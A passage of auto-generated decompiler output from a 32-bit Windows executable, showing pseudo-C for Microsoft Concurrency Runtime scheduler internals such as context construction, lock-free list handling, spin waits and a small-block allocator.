  int v4; // edi
  _DWORD *v5; // esi
  void (__thiscall *v6)(int, int); // ebx
  int v7; // eax
  int v8; // eax
  int v9; // ebx
  int v10; // eax
  int v11; // ebx
  int v13[3]; // [esp-10h] [ebp-24h] BYREF
  int v14; // [esp-4h] [ebp-18h]
  int v15; // [esp+Ch] [ebp-8h]
  int v16; // [esp+10h] [ebp-4h]

  v1 = (int)this;
  v16 = (int)this;
  sub_437646(*this[20], (int)(this + 53));
  sub_43CF11((_DWORD *)(**(_DWORD **)(v1 + 80) + 48), *(_DWORD *)(v1 + 144));
  _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(v1 + 80) + 36));
  if ( !*(_BYTE *)(v1 + 172) )
    _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(v1 + 80) + 20));
  sub_43D3A7(**(volatile signed __int32 ***)(v1 + 80), (_DWORD *)v1);
  if ( !*(_BYTE *)(v1 + 96) )
    sub_43CF11((_DWORD *)(**(_DWORD **)(v1 + 80) + 72), *(_DWORD *)(v1 + 144));
  v2 = (_DWORD *)(v1 + 16);
  *(_DWORD *)(v1 + 124) = 0;
  if ( *(_DWORD *)(v1 + 20) - *(_DWORD *)(v1 + 16) > 0 )
  {
    v3 = sub_43D0F4((_DWORD *)(v1 + 16));
    v15 = v3;
    if ( v3 )
    {
      v4 = v3;
      do
      {
        v5 = (_DWORD *)sub_41DA9B((_DWORD *)(v4 + 4));
        sub_4380FD(v13, v5 + 3);
        sub_43FD72(v5, v4, v13[0], v13[1], v13[2], v14);
        if ( v2[1] - *v2 <= 0 )
          break;
        v4 = sub_43D0F4(v2);
      }
      while ( v4 );
      v1 = v16;
    }
  }
  v15 = *(_DWORD *)(v1 + 88);
  v6 = *(void (__thiscall **)(int, int))(*(_DWORD *)v15 + 8);
  v7 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v1 + 80) + 52))(**(_DWORD **)(v1 + 80));
  v6(v15, v7);
  v8 = v16;
  *(_DWORD *)(v16 + 88) = 0;
  v9 = *(_DWORD *)(v8 + 136);
  v10 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v8 + 80) + 4))(**(_DWORD **)(v8 + 80));
  v14 = v9;
  v11 = v16;
  sub_43D588(2, 4u, v10, v14);
  if ( *(_DWORD *)(v11 + 92) )
  {
    sub_4377DF(*(char **)(v11 + 92));
    *(_DWORD *)(v11 + 92) = 0;
  }
  return sub_43D142(
           (PSLIST_HEADER)(*(_DWORD *)(v11 + 80) + 56),
           (struct _SINGLE_LIST_ENTRY *)v11,
           *(_DWORD *)(v11 + 100),
           1);
}

//----- (0043D393) --------------------------------------------------------
char __thiscall sub_43D393(int this)
{
  return sub_436C47(**(_DWORD ***)(this + 80), (_DWORD *)(this + 192));
}

//----- (0043D3A7) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_43D3A7(volatile signed __int32 *this, _DWORD *a2)
{
  unsigned int v3; // edx
  unsigned int v4; // ecx
  volatile signed __int32 *result; // eax

  v3 = a2[26] - a2[28];
  a2[28] = a2[26];
  _InterlockedExchangeAdd(this + 111, v3);
  v4 = a2[27] - a2[29];
  a2[29] = a2[27];
  result = this + 112;
  _InterlockedExchangeAdd(this + 112, v4);
  return result;
}

//----- (0043D3E1) --------------------------------------------------------
int __thiscall sub_43D3E1(_DWORD *this, unsigned int a2)
{
  int v2; // ebx
  int v3; // edi
  int result; // eax
  char v5[8]; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-8h]
  void (*v7)(); // [esp+18h] [ebp-4h]

  v2 = this[1];
  v3 = 1 << (a2 & 0x1F);
  result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
  if ( (result & v3) != 0 )
  {
    v6 = 0;
    v7 = sub_43051F;
    while ( 1 )
    {
      result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
      if ( (result & v3) == 0 )
        break;
      sub_42E8F5((int)v5);
    }
  }
  return result;
}
// 43D3E1: using guessed type char var_10[8];

//----- (0043D429) --------------------------------------------------------
int __thiscall sub_43D429(_DWORD *this, unsigned int a2)
{
  int v2; // ebx
  int v3; // edi
  int result; // eax
  char v5[8]; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-8h]
  void (*v7)(); // [esp+18h] [ebp-4h]

  v2 = this[1];
  v3 = 1 << (a2 & 0x1F);
  result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
  if ( (result & v3) == 0 )
  {
    v6 = 0;
    v7 = sub_43051F;
    while ( 1 )
    {
      result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
      if ( (result & v3) != 0 )
        break;
      sub_42E8F5((int)v5);
    }
  }
  return result;
}
// 43D429: using guessed type char var_10[8];

//----- (0043D471) --------------------------------------------------------
char __thiscall sub_43D471(void *this, _DWORD *a2, int a3)
{
  int v4; // esi
  char v6[8]; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+14h] [ebp-8h]
  void (*v8)(); // [esp+18h] [ebp-4h]

  if ( *((_DWORD *)this + 31) )
  {
    v7 = 0;
    v8 = sub_43051F;
    do
      sub_42E8F5((int)v6);
    while ( *((_DWORD *)this + 31) );
  }
  v4 = a3;
  if ( a3 )
  {
    if ( !*(_DWORD *)(a3 + 28) )
      sub_43EAA5(a3, (int)a2, 0, 0);
    goto LABEL_7;
  }
  v4 = sub_44020A(a2, 0, 0);
  if ( v4 )
  {
LABEL_7:
    (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, v4);
    (*(void (__thiscall **)(_DWORD, _DWORD))(**((_DWORD **)this + 22) + 20))(
      *((_DWORD *)this + 22),
      *((_DWORD *)this + 31));
    return 1;
  }
  sub_43CF95((int)this, 4, 1);
  sub_4358A6(**((_DWORD **)this + 20));
  return 0;
}
// 43D471: using guessed type char var_10[8];

//----- (0043D50D) --------------------------------------------------------
int __cdecl sub_43D50D(char a1, char a2, int a3, int a4)
{
  int result; // eax
  _DWORD v5[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_492850 )
  {
    memset((char *)v5 + 2, 0, 0x3Eu);
    v5[11] = 0x20000;
    LOWORD(v5[0]) = 64;
    LOBYTE(v5[1]) = a1;
    BYTE1(v5[1]) = a2;
    v5[6] = dword_471484[0];
    v5[7] = dword_471484[1];
    v5[8] = dword_471484[2];
    v5[9] = dword_471484[3];
    v5[13] = a3;
    v5[12] = a4;
    return sub_43C82A(dword_492850, dword_492848, dword_49284C, (int)v5);
  }
  return result;
}
// 471484: using guessed type _DWORD dword_471484[4];
// 492848: using guessed type int dword_492848;
// 49284C: using guessed type int dword_49284C;

//----- (0043D588) --------------------------------------------------------
int __stdcall sub_43D588(char a1, unsigned __int8 a2, int a3, int a4)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_492844 )
  {
    result = dword_492840;
    if ( (dword_492840 & 4) != 0 )
      return sub_43D50D(a1, a2, a3, a4);
  }
  return result;
}
// 492840: using guessed type int dword_492840;
// 492844: using guessed type char byte_492844;

//----- (0043D5B5) --------------------------------------------------------
char __thiscall sub_43D5B5(int this, char a2, char a3)
{
  _DWORD *v4; // eax
  unsigned int v5; // esi
  char result; // al
  _DWORD *v7; // [esp+8h] [ebp-4h]

  v4 = **(_DWORD ***)(this + 80);
  v7 = v4;
  if ( *(_BYTE *)(this + 96) )
  {
    if ( !a2 )
    {
      v5 = *(_DWORD *)(this + 144);
      *(_BYTE *)(this + 98) = 1;
      sub_43CF51(v4 + 18, v5);
      sub_43CC3B(v7, v5);
    }
  }
  else if ( a2 )
  {
    sub_43CF11(v4 + 18, *(_DWORD *)(this + 144));
  }
  result = a3;
  *(_BYTE *)(this + 96) = a2;
  *(_BYTE *)(this + 97) = a3;
  return result;
}

//----- (0043D613) --------------------------------------------------------
int __thiscall sub_43D613(_DWORD *this)
{
  unsigned int v1; // edx
  unsigned int i; // esi
  int result; // eax

  v1 = (unsigned int)(*this + 31) >> 5;
  for ( i = 0; i < v1; ++i )
  {
    result = this[1];
    *(_DWORD *)(result + 4 * i) = 0;
  }
  return result;
}

//----- (0043D630) --------------------------------------------------------
char *__thiscall sub_43D630(char *this, int a2, int a3, int *a4)
{
  _DWORD *v5; // ecx
  _DWORD *v6; // ecx

  v5 = this + 8;
  *((_DWORD *)this + 1) = a4;
  *v5 = 0;
  v5[1] = 0;
  sub_4357D5((int)v5, a2);
  sub_434608((unsigned int *)this + 4, 0x1001u);
  *((_DWORD *)this + 7) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 0;
  *((_DWORD *)this + 11) = a3;
  sub_434646((PSLIST_HEADER)this + 7, *a4, 256, 0x7FFFFFFF);
  v6 = (_DWORD *)*((_DWORD *)this + 1);
  *(_DWORD *)this = *v6;
  *((_DWORD *)this + 12) = v6[46];
  return this;
}

//----- (0043D6AD) --------------------------------------------------------
void __thiscall sub_43D6AD(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 47;
    v2 = v2->Next;
    sub_43C94B(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 47;
    v4 = v4->Next;
    sub_43C94B(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 47;
    Next = Next->Next;
    sub_43C94B(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_43C94B(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j_j___free_base(v8->Next);
      sub_42CF7C(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0043D750) --------------------------------------------------------
void __thiscall sub_43D750(int this)
{
  sub_43D6AD((PSLIST_HEADER)(this + 56));
  sub_4380AE((int *)(this + 16));
  j_j_j___free_base(*(void **)(this + 24));
  j_j_j___free_base(*(void **)(this + 12));
}

//----- (0043D779) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_43D779(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_45((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_43055D;
        do
          sub_42E8F5((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 100) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 43D779: using guessed type char var_24[8];

//----- (0043D8D5) --------------------------------------------------------
signed __int32 __thiscall sub_43D8D5(_DWORD *this, int a2, char a3)
{
  PSLIST_ENTRY v4; // eax
  signed __int32 v5; // edi
  int v6; // ecx
  _DWORD *v8; // [esp+10h] [ebp-4h]

  v8 = sub_4359BC();
  v4 = InterlockedPopEntrySList((PSLIST_HEADER)this + 7);
  if ( !v4 || (v5 = (signed __int32)&v4[-47], v4 == (PSLIST_ENTRY)188) )
    v5 = (*(int (__thiscall **)(_DWORD, _DWORD *, int))(*(_DWORD *)*this + 92))(*this, this, a2);
  else
    (*(void (__thiscall **)(signed __int32, _DWORD *, int))(*(_DWORD *)v5 + 24))(v5, this, a2);
  if ( a3 )
  {
    *(_BYTE *)(v5 + 172) = 1;
    *(_DWORD *)(v5 + 176) = v8 - 1;
    v8[40] = v5;
  }
  _InterlockedIncrement(this + 9);
  sub_43CF51((_DWORD *)(*this + 48), *(_DWORD *)(v5 + 144));
  if ( *(_DWORD *)(*this + 436) == *(_DWORD *)(*this + 440) && *(int *)(*this + 20) > 0 )
  {
    sub_43D779(this + 14, v5);
    if ( sub_437F9D((volatile signed __int32 *)*this, 1) )
    {
      if ( v8 )
        v6 = sub_41DA9B(v8);
      else
        v6 = *(_DWORD *)(this[1] + 8);
      (*(void (__thiscall **)(signed __int32, int, _DWORD))(*(_DWORD *)v5 + 28))(v5, v6, 0);
    }
  }
  else
  {
    sub_43D779(this + 14, v5);
    sub_43CF95(v5, 1, 0);
  }
  return v5;
}

//----- (0043D9DD) --------------------------------------------------------
char __thiscall sub_43D9DD(_DWORD *this)
{
  LPVOID v2; // eax
  int v3; // esi
  _DWORD *v4; // edi
  char v5; // bl

  v2 = sub_4359BC();
  v3 = (int)v2 + 156;
  if ( !v2 )
    v3 = 160;
  v4 = (_DWORD *)*this;
  if ( !sub_436B00((_DWORD *)(*v4 + 60), (int)(v4 + 1)) )
    return 0;
  v5 = 1;
  if ( ((1 << (*(_DWORD *)(*(_DWORD *)v3 + 144) & 0x1F)) & *(_DWORD *)(v4[2]
                                                                     + 4 * (*(_DWORD *)(*(_DWORD *)v3 + 144) >> 5))) != 0 )
    return 0;
  return v5;
}

//----- (0043DA31) --------------------------------------------------------
int __thiscall sub_43DA31(_DWORD *this, int a2)
{
  int v2; // edi
  int v3; // esi
  _DWORD *v4; // eax
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  v2 = this[30];
  v3 = 0;
  if ( v2 <= 0 )
    return 0;
  v4 = this + 14;
  for ( i = this + 14; ; v4 = i )
  {
    result = sub_434DA3(v4, v3);
    if ( result )
    {
      if ( *(_DWORD *)(result + 88) == a2 )
        break;
    }
    if ( ++v3 >= v2 )
      return 0;
  }
  return result;
}

//----- (0043DA6E) --------------------------------------------------------
int __thiscall sub_43DA6E(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  int v4; // esi

  if ( (*a2 & 0xFFFFFFF) != 3 )
    return 0;
  if ( a2[1] == *(_DWORD *)(*this + 372) )
    return a2[3];
  v4 = 0;
  if ( (int)this[30] <= 0 )
    return 0;
  while ( 1 )
  {
    result = sub_434DA3(this + 14, v4);
    if ( result )
    {
      if ( *(_DWORD *)(result + 140) == a2[2] )
        break;
    }
    if ( ++v4 >= this[30] )
      return 0;
  }
  return result;
}

//----- (0043DAC8) --------------------------------------------------------
char __thiscall sub_43DAC8(_DWORD *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7)
{
  char v7; // bl
  __int32 v9; // eax
  int v10; // edi
  __int32 v11; // eax

  v7 = 1;
  if ( (a3 & 0xFFFFFFF) != 3 || (v9 = sub_43DA6E(this, &a3)) == 0 || !sub_43CBAD(v9, a2, a7, 1) )
  {
    v10 = 0;
    if ( (int)this[30] <= 0 )
    {
      return 0;
    }
    else
    {
      while ( 1 )
      {
        v11 = sub_434DA3(this + 14, v10);
        if ( v11 )
        {
          if ( sub_43CBAD(v11, a2, a7, 1) )
            break;
        }
        if ( ++v10 >= this[30] )
          return 0;
      }
    }
  }
  return v7;
}

//----- (0043DB38) --------------------------------------------------------
int *__thiscall sub_43DB38(int *this, int *a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)*this + 4))(*this);
  sub_4424D7(a2, 2, this[12], v3, (int)this);
  return a2;
}

//----- (0043DB6C) --------------------------------------------------------
__int32 __thiscall sub_43DB6C(int *this, char a2)
{
  __int32 v3; // edi
  volatile __int32 *v5; // [esp+10h] [ebp-10h]

  v5 = (volatile __int32 *)this[5];
  sub_4304D3(v5);
  v3 = sub_43DBAF(this, a2);
  sub_430514(v5);
  return v3;
}

//----- (0043DBAF) --------------------------------------------------------
__int32 __thiscall sub_43DBAF(int *this, char a2)
{
  int v3; // edi
  int v4; // ecx
  __int32 v5; // ebx

  while ( 1 )
  {
    if ( *this >= this[1] )
      return 0;
    v3 = *this;
    v4 = *this & this[2];
    if ( (*(_BYTE *)(this[3] + 4 * v4) & 1) != 0 && !a2 && sub_43D9DD((_DWORD *)(this[4] + 8 * v4)) )
      return 0;
    v5 = _InterlockedExchange((volatile __int32 *)(this[3] + 4 * (this[2] & v3)), 0);
    if ( (v5 & 1) == 0 )
      break;
    v5 &= ~1u;
    if ( sub_43875A((int *)(this[4] + 8 * (this[2] & v3)), 0) )
      break;
    *this = v3 + 1;
  }
  if ( v5 )
    *this = v3 + 1;
  return v5;
}

//----- (0043DC2D) --------------------------------------------------------
void __thiscall sub_43DC2D(_DWORD *this)
{
  *this = 0;
  this[1] = sub_430237(0);
}

//----- (0043DC42) --------------------------------------------------------
void __thiscall sub_43DC42(_DWORD *this)
{
  _DWORD *v2; // eax

  if ( *this )
  {
    do
    {
      v2 = (_DWORD *)sub_430237(this[1]);
      this[1] = *v2;
      j_j_j___free_base(v2);
    }
    while ( (*this)-- != 1 );
  }
}

//----- (0043DC94) --------------------------------------------------------
int *__thiscall sub_43DC94(_DWORD *this)
{
  int *result; // eax
  int v3; // ecx

  result = (int *)sub_430237(this[1]);
  if ( result )
  {
    v3 = *result;
    --*this;
    this[1] = v3;
  }
  return result;
}

//----- (0043DCAD) --------------------------------------------------------
int *__thiscall sub_43DCAD(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v5; // edi
  int *v6; // esi

  v3 = a2 + 4;
  v4 = sub_43DD5E(a2 + 4);
  v5 = v4;
  if ( v4 == -1 )
    goto LABEL_4;
  v6 = sub_43DC94(&this[2 * v4 + 1]);
  if ( !v6 )
  {
    v3 = dword_4715B0[v5];
LABEL_4:
    v6 = (int *)unknown_libname_45(v3);
  }
  *v6 = sub_430237(v5);
  return v6 + 1;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 4715B0: using guessed type int dword_4715B0[98];

//----- (0043DCFD) --------------------------------------------------------
char __thiscall sub_43DCFD(int *this, _DWORD *a2)
{
  int v3; // eax

  if ( *this >= 32 )
    return 0;
  *a2 = this[1];
  v3 = sub_430237((int)a2);
  ++*this;
  this[1] = v3;
  return 1;
}

//----- (0043DD27) --------------------------------------------------------
void __thiscall sub_43DD27(int *this, int a2)
{
  _DWORD *v2; // esi
  int v4; // eax

  v2 = (_DWORD *)(a2 - 4);
  v4 = sub_430237(*(_DWORD *)(a2 - 4));
  if ( v4 == -1 || !sub_43DCFD(&this[2 * v4 + 1], v2) )
    j_j_j___free_base(v2);
}

//----- (0043DD5E) --------------------------------------------------------
int __cdecl sub_43DD5E(int a1)
{
  unsigned int v1; // edx
  int v3; // edx
  int v4; // ecx

  v1 = (a1 + 7) & 0xFFFFFFF8;
  if ( v1 > 0x1000 )
    return -1;
  v3 = v1 >> 3;
  if ( (unsigned int)v3 > 0x20 )
  {
    v4 = 5;
    if ( v3 >> 5 )
    {
      do
        ++v4;
      while ( v3 >> v4 > 0 );
    }
    v3 = 16 * (v4 - 5) + ((~((1 << (v4 - 5)) - 1) & ((1 << (v4 - 5)) - 1 + v3)) >> (v4 - 5));
  }
  return v3 - 1;
}

//----- (0043DDAF) --------------------------------------------------------
int *__cdecl sub_43DDAF(int a1)
{
  int v1; // esi
  int v2; // eax
  int v3; // edi
  int *v4; // esi

  v1 = a1 + 4;
  v2 = sub_43DD5E(a1 + 4);
  v3 = v2;
  if ( v2 != -1 )
    v1 = dword_4715B0[v2];
  v4 = (int *)unknown_libname_45(v1);
  *v4 = sub_430237(v3);
  return v4 + 1;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 4715B0: using guessed type int dword_4715B0[98];

//----- (0043DDE8) --------------------------------------------------------
_DWORD *__thiscall sub_43DDE8(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  *this = &Concurrency::IExecutionContext::`vftable';
  sub_43814B(this + 1, a2, 0);
  *((_BYTE *)this + 179) &= 0xFCu;
  result = this;
  *this = &Concurrency::details::InternalContextBase::`vftable';
  this[1] = &Concurrency::details::InternalContextBase::`vftable';
  this[39] = 0;
  this[40] = 0;
  this[41] = 0;
  this[42] = 0;
  this[43] = 0;
  *((_BYTE *)this + 176) = 0;
  *((_BYTE *)this + 178) = 0;
  this[57] = 0;
  this[7] = 0;
  *((_BYTE *)this + 236) = 1;
  return result;
}
// 47173C: using guessed type void *Concurrency::IExecutionContext::`vftable';
// 471754: using guessed type void *Concurrency::details::InternalContextBase::`vftable';
// 47177C: using guessed type void *Concurrency::details::InternalContextBase::`vftable';

//----- (0043DE5F) --------------------------------------------------------
std::exception *__thiscall sub_43DE5F(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::context_self_unblock::`vftable';
  return this;
}
// 470EB8: using guessed type void *Concurrency::context_self_unblock::`vftable';

//----- (0043DE7A) --------------------------------------------------------
std::exception *__thiscall sub_43DE7A(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::context_unblock_unbalanced::`vftable';
  return this;
}
// 470EAC: using guessed type void *Concurrency::context_unblock_unbalanced::`vftable';

//----- (0043DE95) --------------------------------------------------------
std::exception *__thiscall sub_43DE95(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_oversubscribe_operation::`vftable';
  return this;
}
// 470F00: using guessed type void *Concurrency::invalid_oversubscribe_operation::`vftable';

//----- (0043DEB0) --------------------------------------------------------
std::exception *__thiscall sub_43DEB0(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::nested_scheduler_missing_detach::`vftable';
  return this;
}
// 470EF4: using guessed type void *Concurrency::nested_scheduler_missing_detach::`vftable';

//----- (0043DECB) --------------------------------------------------------
void __thiscall sub_43DECB(_DWORD *this)
{
  void *v1; // esi

  v1 = this + 1;
  *this = &Concurrency::details::InternalContextBase::`vftable';
  this[1] = &Concurrency::details::InternalContextBase::`vftable';
  sub_43E2F2(this);
  sub_438292(v1);
}
// 471754: using guessed type void *Concurrency::details::InternalContextBase::`vftable';
// 47177C: using guessed type void *Concurrency::details::InternalContextBase::`vftable';

//----- (0043DF17) --------------------------------------------------------
int sub_43DF17()
{
  return UserMathErrorFunction();
}

//----- (0043DF4D) --------------------------------------------------------
char *__thiscall sub_43DF4D(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_43DECB(this - 1);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v2;
}

//----- (0043DF7A) --------------------------------------------------------
int __thiscall sub_43DF7A(_DWORD *this, int a2, int a3, int a4, int a5)
{
  LPVOID v6; // eax
  int v7; // edx
  int v8; // edi
  int v9; // edi
  int (__thiscall *v10)(int, _DWORD *, int, int, int, int); // esi
  int result; // eax
  int v12; // edx
  int v13; // esi
  unsigned int *v14; // esi
  _DWORD *v15; // esi
  int v16; // [esp-14h] [ebp-38h] BYREF
  int v17; // [esp-10h] [ebp-34h] BYREF
  int v18; // [esp-Ch] [ebp-30h]
  int v19; // [esp-8h] [ebp-2Ch]
  int v20; // [esp-4h] [ebp-28h]
  int v21[5]; // [esp+Ch] [ebp-18h] BYREF
  int v22; // [esp+20h] [ebp-4h]

  v6 = sub_4359BC();
  v7 = this[8];
  v8 = (int)v6;
  v22 = (int)v6;
  if ( *(int *)(v7 + 440) > 0 )
  {
    v9 = this[8];
    v10 = *(int (__thiscall **)(int, _DWORD *, int, int, int, int))(*(_DWORD *)v9 + 60);
    sub_4380FD(&v17, &a2);
    result = v10(v9, this, v17, v18, v19, v20);
    if ( (_BYTE)result )
      return result;
    v8 = v22;
  }
  if ( !v8 || *(_BYTE *)(v8 + 76) || this[8] != sub_41DA3D((_DWORD *)v8) )
    goto LABEL_18;
  UserMathErrorFunction();
  v12 = this[7];
  if ( (*(_BYTE *)(*(_DWORD *)(v12 + 256) + 48) & 2) != 0
    || ((1 << (*(_BYTE *)(*(_DWORD *)(v8 + 156) + 144) & 0x1F)) & *(_DWORD *)(*(_DWORD *)(v12 + 32)
                                                                            + 4
                                                                            * (*(_DWORD *)(*(_DWORD *)(v8 + 156) + 144) >> 5))) == 0
    || *(_DWORD *)(*(_DWORD *)(v8 + 156) + 20) - *(_DWORD *)(*(_DWORD *)(v8 + 156) + 16) >= *(unsigned __int16 *)(this[8] + 16) )
  {
    UserMathErrorFunction();
LABEL_18:
    v15 = (_DWORD *)this[7];
    sub_4380FD(&v17, &a2);
    return sub_43FD72(v15, (int)this, v17, v18, v19, v20);
  }
  v22 = this[7];
  v13 = v22;
  if ( sub_438AF9((_DWORD *)v8) != *(_DWORD *)(v13 + 256) )
    this[57] = 1;
  sub_43EB0F((int *)(*(_DWORD *)(v8 + 156) + 16), (int)this);
  if ( *(int *)(this[8] + 436) > 0 )
  {
    v14 = (unsigned int *)this[8];
    sub_4380FD(v21, &a2);
    v20 = 11;
    sub_4380FD(&v16, v21);
    sub_4379A2(v14, v22, v16, v17, v18, v19, v20);
    v13 = v22;
  }
  if ( sub_438AF9((_DWORD *)v8) != *(_DWORD *)(v13 + 256) )
    this[57] = 0;
  return UserMathErrorFunction();
}
// 43DF7A: using guessed type int var_18[5];

//----- (0043E0F4) --------------------------------------------------------
int *__thiscall sub_43E0F4(_DWORD **this, int a2)
{
  PSLIST_ENTRY v3; // eax
  int *v4; // esi

  UserMathErrorFunction();
  v3 = sub_43CD60(this[39]);
  v4 = sub_43DCAD(v3, a2);
  UserMathErrorFunction();
  return v4;
}

//----- (0043E148) --------------------------------------------------------
int __thiscall sub_43E148(int this)
{
  int v2; // ebx
  int v3; // eax
  int v4; // esi
  char v5; // al
  signed __int32 v6; // ecx
  struct _SINGLE_LIST_ENTRY *v7; // edi
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v9; // esi
  int v10; // eax
  int v12[7]; // [esp-10h] [ebp-24h] BYREF
  int v13; // [esp+Ch] [ebp-8h]
  bool v14; // [esp+12h] [ebp-2h] BYREF
  bool v15; // [esp+13h] [ebp-1h] BYREF

  v13 = this;
  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_43914D(3, 4u, v3, v2);
  v4 = 1;
  v5 = *(_BYTE *)(*(_DWORD *)(v13 + 156) + 173);
  v6 = _InterlockedIncrement((volatile signed __int32 *)(v13 + 44));
  if ( v5 )
  {
    if ( v6 != 1 || _InterlockedCompareExchange((volatile signed __int32 *)(v13 + 44), 2, 1) != 1 )
      v4 = 2;
    sub_43EDBA((struct _SINGLE_LIST_ENTRY *)(v13 - 4), v4);
  }
  else if ( v6 == 1 )
  {
    v15 = 0;
    v14 = 0;
    v7 = (struct _SINGLE_LIST_ENTRY *)sub_43E561((_DWORD *)(v13 - 4), &v15, &v14);
    if ( _InterlockedCompareExchange((volatile signed __int32 *)(v13 + 44), 2, 1) == 1 )
    {
      if ( v15 )
